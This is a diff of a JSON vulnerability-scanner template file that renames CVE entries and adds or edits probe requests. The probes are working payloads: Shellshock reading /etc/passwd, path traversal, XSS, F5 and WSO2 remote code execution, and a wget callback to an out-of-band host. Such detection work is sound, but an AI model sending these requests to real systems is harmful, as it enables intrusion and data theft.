@@ -67,7 +67,7 @@
     {
       "id": "CVE-2005-2428",
       "info": {
-        "name": "Lotus Domino R5 and R6 WebMail Default Configuration Information Disclosure",
+        "name": "Lotus Domino R5 and R6 WebMail - Information Disclosure",
         "severity": "medium"
       },
       "requests": [
@@ -3311,9 +3311,9 @@
       "requests": [
         {
           "headers": {
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -4925,6 +4925,22 @@
       ]
     },
     {
+      "id": "CVE-2017-11512",
+      "info": {
+        "name": "ManageEngine ServiceDesk - Unauthenticated Arbitrary File Download",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/fosagent/repl/download-file?basedir=4&filepath=..\\..\\Windows\\win.ini",
+            "{{BaseURL}}/fosagent/repl/download-snapshot?name=..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2017-11610",
       "info": {
         "name": "Supervisor XMLRPC Exec",
@@ -6284,11 +6300,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Expect": "100-continue",
+            "Content-type": "image/jp2",
             "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue",
-            "Content-type": "image/jp2"
+            "X-Tika-OCRLanguage": "//E:Jscript"
           },
           "method": "PUT",
           "path": [
@@ -7940,6 +7956,24 @@
       ]
     },
     {
+      "id": "CVE-2019-12962",
+      "info": {
+        "name": "LiveZilla Server 8.0.1.0 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "headers": {
+            "Accept-Language": ";alert(document.domain)//"
+          },
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/mobile/index.php"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2019-13101",
       "info": {
         "name": "D-Link DIR-600M Authentication Bypass",
@@ -8505,7 +8539,7 @@
     {
       "id": "CVE-2019-1821",
       "info": {
-        "name": "Cisco Prime Infrastructure Unauthorized RCE",
+        "name": "Cisco Prime Infrastructure and Cisco Evolved Programmable Network Manager - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -8535,7 +8569,7 @@
     {
       "id": "CVE-2019-18394",
       "info": {
-        "name": "Openfire Full Read SSRF",
+        "name": "Ignite Realtime Openfire <=4.4.2 - Server-Side Request Forgery",
         "severity": "critical"
       },
       "requests": [
@@ -8550,7 +8584,7 @@
     {
       "id": "CVE-2019-18818",
       "info": {
-        "name": "strapi CMS Unauthenticated Admin Password Reset",
+        "name": "strapi CMS <3.0.0-beta.17.5 - Admin Password Reset",
         "severity": "critical"
       },
       "requests": [
@@ -8609,7 +8643,7 @@
     {
       "id": "CVE-2019-19781",
       "info": {
-        "name": "Citrix ADC Directory Traversal",
+        "name": "Citrix ADC and Gateway - Directory Traversal",
         "severity": "critical"
       },
       "requests": [
@@ -8714,7 +8748,7 @@
     {
       "id": "CVE-2019-2578",
       "info": {
-        "name": "Oracle WebCenter Sites Broken Access Control",
+        "name": "Oracle Fusion Middleware WebCenter Sites 12.2.1.3.0  - Broken Access Control",
         "severity": "high"
       },
       "requests": [
@@ -8729,7 +8763,7 @@
     {
       "id": "CVE-2019-2579",
       "info": {
-        "name": "Oracle WebCenter Sites - SQL Injection",
+        "name": "Oracle Fusion Middleware WebCenter Sites 12.2.1.3.0 - SQL Injection",
         "severity": "medium"
       },
       "requests": [
@@ -8773,7 +8807,7 @@
     {
       "id": "CVE-2019-2725",
       "info": {
-        "name": "Oracle WebLogic Server - Unauthenticated RCE",
+        "name": "Oracle WebLogic Server - Remote Command Execution",
         "severity": "critical"
       },
       "requests": [
@@ -8820,7 +8854,7 @@
     {
       "id": "CVE-2019-3396",
       "info": {
-        "name": "Atlassian Confluence Path Traversal",
+        "name": "Atlassian Confluence Server - Path Traversal",
         "severity": "critical"
       },
       "requests": [
@@ -8924,7 +8958,7 @@
     {
       "id": "CVE-2019-3929",
       "info": {
-        "name": "Barco/AWIND OEM Presentation Platform Unauthenticated Remote Command Injection (CVE-2019-3929)",
+        "name": "Barco/AWIND OEM Presentation Platform - Remote Command Injection",
         "severity": "critical"
       },
       "requests": [
@@ -8943,7 +8977,7 @@
     {
       "id": "CVE-2019-5127",
       "info": {
-        "name": "YouPHPTube Encoder RCE",
+        "name": "YouPHPTube Encoder 2.3 - Remote Command Injection",
         "severity": "critical"
       },
       "requests": [
@@ -8990,7 +9024,7 @@
     {
       "id": "CVE-2019-6112",
       "info": {
-        "name": "WordPress Plugin Sell Media v2.4.1 - Cross-Site Scripting",
+        "name": "WordPress Sell Media 2.4.1 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -9050,7 +9084,7 @@
     {
       "id": "CVE-2019-7238",
       "info": {
-        "name": "NEXUS < 3.14.0 Remote Code Execution",
+        "name": "Sonatype Nexus Repository Manager  <3.15.0 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -9144,7 +9178,7 @@
     {
       "id": "CVE-2019-7609",
       "info": {
-        "name": "Kibana Timelion Arbitrary Code Execution",
+        "name": "Kibana Timelion - Arbitrary Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -9258,7 +9292,7 @@
     {
       "id": "CVE-2019-8982",
       "info": {
-        "name": "Wavemaker Studio 6.6 Local File Inclusion/Server-Side Request Forgery",
+        "name": "Wavemaker Studio 6.6 - Local File Inclusion/Server-Side Request Forgery",
         "severity": "critical"
       },
       "requests": [
@@ -9292,7 +9326,7 @@
     {
       "id": "CVE-2019-9618",
       "info": {
-        "name": "WordPress Plugin GraceMedia Media Player 1.0 - Local File Inclusion (LFI)",
+        "name": "WordPress GraceMedia Media Player 1.0 - Local File Inclusion",
         "severity": "critical"
       },
       "requests": [
@@ -9307,7 +9341,7 @@
     {
       "id": "CVE-2019-9670",
       "info": {
-        "name": "Zimbra Collaboration XXE",
+        "name": "Synacor Zimbra Collaboration <8.7.11p10 - XML External Entity Injection",
         "severity": "critical"
       },
       "requests": [
@@ -9336,7 +9370,7 @@
     {
       "id": "CVE-2019-9733",
       "info": {
-        "name": "Artifactory Access-Admin Login Bypass",
+        "name": "JFrog Artifactory 6.7.3 - Admin Login Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -9486,7 +9520,7 @@
     {
       "id": "CVE-2020-11034",
       "info": {
-        "name": "GLPI v.9.4.6 - Open redirect",
+        "name": "GLPI <9.4.6 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -9531,7 +9565,7 @@
     {
       "id": "CVE-2020-11529",
       "info": {
-        "name": "Grav 1.7  Open Redirect",
+        "name": "Grav <1.7  - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -9546,7 +9580,7 @@
     {
       "id": "CVE-2020-11546",
       "info": {
-        "name": "SuperWebmailer Remote Code Execution",
+        "name": "SuperWebmailer 7.21.0.01526 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -9703,7 +9737,7 @@
     {
       "id": "CVE-2020-12116",
       "info": {
-        "name": "Unauthenticated Zoho ManageEngine OpManger Arbitrary File Read",
+        "name": "Zoho ManageEngine OpManger - Arbitrary File Read",
         "severity": "high"
       },
       "requests": [
@@ -9908,7 +9942,7 @@
     {
       "id": "CVE-2020-14092",
       "info": {
-        "name": "WordPress PayPal Pro <1.1.65- SQL Injection",
+        "name": "WordPress PayPal Pro <1.1.65 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -10198,7 +10232,7 @@
     {
       "id": "CVE-2020-17453",
       "info": {
-        "name": "WSO2 Carbon Management Console - XSS",
+        "name": "WSO2 Carbon Management Console <=5.10 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -10382,7 +10416,7 @@
     {
       "id": "CVE-2020-19360",
       "info": {
-        "name": "FHEM 6.0 Local File Inclusion",
+        "name": "FHEM 6.0 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -10524,7 +10558,7 @@
     {
       "id": "CVE-2020-2140",
       "info": {
-        "name": "Jenkin Audit Trail Plugin XSS",
+        "name": "Jenkin Audit Trail <=3.2 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -10660,7 +10694,7 @@
     {
       "id": "CVE-2020-24223",
       "info": {
-        "name": "Mara CMS  7.5 - Reflective Cross-Site Scripting",
+        "name": "Mara CMS  7.5 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -12408,8 +12442,8 @@
       "requests": [
         {
           "raw": [
-            "POST /auth/change HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\nusername=root&password={{url_encode('123\\\",\\\"$6$$\\\"));import os;os.system(\\\"wget http://{{interactsh-url}}\\\");print(crypt.crypt(\\\"')}}\n",
-            "POST /auth HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\nusername=root&password={{url_encode('123\\\",\\\"$6$$\\\"));import os;os.system(\\\"wget http://{{interactsh-url}}\\\");print(crypt.crypt(\\\"')}}\n"
+            "POST /auth/change HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\nusername=root&password={{url_encode('123\\\",\\\"$6$$\\\"));import os;os.system(\\\"wget http://{{interactsh-url}}\\\");print(crypt.crypt(\\\"')}}\n",
+            "POST /auth HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\nusername=root&password={{url_encode('123\\\",\\\"$6$$\\\"));import os;os.system(\\\"wget http://{{interactsh-url}}\\\");print(crypt.crypt(\\\"')}}\n"
           ]
         }
       ]
@@ -12546,7 +12580,7 @@
     {
       "id": "CVE-2021-20158",
       "info": {
-        "name": "Trendnet AC2600 TEW-827DRU - Unauthenticated Admin Password Change",
+        "name": "Trendnet AC2600 TEW-827DRU 2.08B01 - Admin Password Change",
         "severity": "critical"
       },
       "requests": [
@@ -12561,7 +12595,7 @@
     {
       "id": "CVE-2021-20167",
       "info": {
-        "name": "Netgear RAX43 - Unauthenticated Command Injection / Authentication Bypass Buffer Overrun via LAN Interface",
+        "name": "Netgear RAX43 1.0.3.96 - Command Injection/Authentication Bypass Buffer Overrun",
         "severity": "critical"
       },
       "requests": [
@@ -12590,7 +12624,7 @@
     {
       "id": "CVE-2021-20837",
       "info": {
-        "name": "Unauthenticated RCE In MovableType",
+        "name": "MovableType - Remote Command Injection",
         "severity": "critical"
       },
       "requests": [
@@ -12636,7 +12670,7 @@
     {
       "id": "CVE-2021-21307",
       "info": {
-        "name": "Remote Code Exploit in Lucee Admin",
+        "name": "Lucee Admin - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -12712,7 +12746,7 @@
     {
       "id": "CVE-2021-21479",
       "info": {
-        "name": "SCIMono < v0.0.19 Remote Code Execution",
+        "name": "SCIMono <0.0.19 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -12787,7 +12821,7 @@
     {
       "id": "CVE-2021-21881",
       "info": {
-        "name": "Lantronix PremierWave 2050 - Remote Code Execution",
+        "name": "Lantronix PremierWave 2050 8.9.0.0R4 - Remote Command Injection",
         "severity": "critical"
       },
       "requests": [
@@ -12802,7 +12836,7 @@
     {
       "id": "CVE-2021-21972",
       "info": {
-        "name": "VMware vCenter Unauthenticated RCE",
+        "name": "VMware vSphere Client (HTML5) - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -12845,7 +12879,7 @@
     {
       "id": "CVE-2021-21978",
       "info": {
-        "name": "VMware View Planner Unauthenticated RCE",
+        "name": "VMware View Planner <4.6 SP1- Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -12859,7 +12893,7 @@
     {
       "id": "CVE-2021-21985",
       "info": {
-        "name": "VMware vSphere Client (HTML5) RCE",
+        "name": "VMware vSphere Client (HTML5) - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -12873,7 +12907,7 @@
     {
       "id": "CVE-2021-22005",
       "info": {
-        "name": "VMware vCenter Server file upload vulnerability",
+        "name": "VMware vCenter Server - Arbitrary File Upload",
         "severity": "critical"
       },
       "requests": [
@@ -12953,7 +12987,7 @@
     {
       "id": "CVE-2021-22205",
       "info": {
-        "name": "Fingerprinting GitLab CE/EE Unauthenticated RCE using ExifTool - Passive Detection",
+        "name": "GitLab CE/EE - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -13007,7 +13041,7 @@
     {
       "id": "CVE-2021-22986",
       "info": {
-        "name": "F5 BIG-IP iControl REST Unauthenticated Remote Command Execution",
+        "name": "F5 BIG-IP iControl REST - Remote Command Execution",
         "severity": "critical"
       },
       "requests": [
@@ -13191,7 +13225,7 @@
     {
       "id": "CVE-2021-24285",
       "info": {
-        "name": "Car Seller - Auto Classifieds Script WordPress plugin SQLI",
+        "name": "WordPress Car Seller - Auto Classifieds Script - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -13427,7 +13461,7 @@
     {
       "id": "CVE-2021-24472",
       "info": {
-        "name": "Onair2 < 3.9.9.2 & KenthaRadio < 2.0.2 - Unauthenticated RFI and SSRF",
+        "name": "Onair2 < 3.9.9.2 & KenthaRadio < 2.0.2 - Remote File Inclusion/Server-Side Request Forgery",
         "severity": "critical"
       },
       "requests": [
@@ -15360,6 +15394,21 @@
       ]
     },
     {
+      "id": "CVE-2021-37416",
+      "info": {
+        "name": "Zoho ManageEngine ADSelfService Plus - Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/LoadFrame?frame_name=x&src=x&single_signout=x%27%3E%3C/iframe%3E%3Cscript%3Ealert(1)%3C/script%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-37538",
       "info": {
         "name": "PrestaShop SmartBlog <4.0.6- SQL Injection",
@@ -17035,6 +17084,24 @@
       ]
     },
     {
+      "id": "CVE-2022-1040",
+      "info": {
+        "name": "Sophos Firewall - RCE",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "headers": {
+            "X-Requested-With": "XMLHttpRequest"
+          },
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/userportal/Controller?mode=8700&operation=1&datagrid=179&json={\"🦞\":\"test\"}"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-1054",
       "info": {
         "name": "RSVP and Event Management < 2.7.8 - Unauthenticated Entries Export",
@@ -17060,6 +17127,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/wp-config.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-1388",
+      "info": {
+        "name": "F5 BIG-IP iControl REST Auth Bypass RCE",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /mgmt/tm/util/bash HTTP/1.1\nHost: {{Hostname}}\nConnection: keep-alive, X-F5-Auth-Token\nX-F5-Auth-Token: a\nAuthorization: Basic {{base64(auth)}}\nContent-Type: application/json\n\n{\n  \"command\": \"run\",\n  \"utilCmdArgs\": \"-c id\"\n}\n"
           ]
         }
       ]
@@ -17561,6 +17642,21 @@
           "raw": [
             "POST /fileupload/toolsAny HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=---------------------------250033711231076532771336998311\nContent-Length: 348\n\n-----------------------------250033711231076532771336998311\nContent-Disposition: form-data; name=\"../../../../repository/deployment/server/webapps/authenticationendpoint/{{to_lower(\"{{randstr}}\")}}.jsp\";filename=\"test.jsp\"\nContent-Type: application/octet-stream\n\n<% out.print(\"WSO2-RCE-CVE-2022-29464\"); %>\n-----------------------------250033711231076532771336998311--\n",
             "GET /authenticationendpoint/{{to_lower(\"{{randstr}}\")}}.jsp HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-29548",
+      "info": {
+        "name": "WSO2 Management Console - Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/carbon/admin/login.jsp?loginStatus=false&errorCode=%27);alert(document.domain)//"
           ]
         }
       ]
